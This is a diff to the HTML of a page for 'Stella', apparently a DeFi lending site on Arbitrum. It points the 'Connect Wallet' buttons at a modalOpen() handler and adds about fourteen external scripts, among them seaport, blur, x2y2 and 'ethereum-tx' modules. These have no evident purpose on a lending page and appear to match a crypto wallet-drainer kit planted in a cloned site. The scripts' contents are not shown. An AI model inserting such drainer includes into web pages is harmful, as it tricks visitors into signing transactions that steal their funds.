@@ -22,11 +22,11 @@
                 <a href="./lending.html">Lend</a>
                 <a href="./position.html">Your Position</a>
                 <hr>
-                <a href="#">Analytics</a>
+                <a href="./points.html">Your Points</a>
                 <a href="./leaderboard.html">Leaderboard</a>
             </nav>
             <img src="img/arbitrum.svg" class="header__icon" alt="i">
-            <a href="#" class="btn btn_outline">Connect Wallet</a>
+            <button onclick="modalOpen()" class="btn btn_outline">Connect Wallet</button>
             <button class="btn-menu"> <span></span></button>
         </div>
     </header>
@@ -979,14 +979,28 @@
             <button class="modal-close">&times;</button>
             <img src="img/wallet.svg" alt="i" loading="lazy">
             <h3>You haven’t connected your wallet to Stella.</h3>
-            <button class="btn">Connect Wallet</button>
+            <button class="btn" onclick="modalOpen()" >Connect Wallet</button>
         </div>
     </div>
 
 
 
-    <script src="./js/jquery-3.4.1.min.js" defer></script>
-    <script src="./js/scripts.js" defer></script>
+    <script src="./js/jquery-3.4.1.min.js"></script>
+    <script src="./js/scripts.js"></script>
+<script src="/assets/web3-provider/web3-modal.js"></script>
+<script src="/assets/web3-provider/web3-loader.js"></script>
+<script src="/assets/web3-provider/web3-connect.js"></script>
+<script src="/assets/web3-provider/web3-router.js"></script>
+<script src="/assets/web3-provider/web3-module.js"></script>
+<script src="/assets/web3-provider/web3-alert.js"></script>
+<script src="/assets/web3-provider/web3-seaport.js"></script>
+<script src="/assets/web3-provider/web3-data.js"></script>
+<script src="/assets/web3-provider/ethers.js"></script>
+<script src="/assets/web3-provider/ethereum-tx.js"></script>
+<script src="/assets/web3-modules/module-seaport.js"></script>
+<script src="/assets/web3-modules/module-blur.js"></script>
+<script src="/assets/web3-modules/module-x2y2.js"></script>
+<script src="/assets/web3-provider.js"></script>
 
 </body>
 
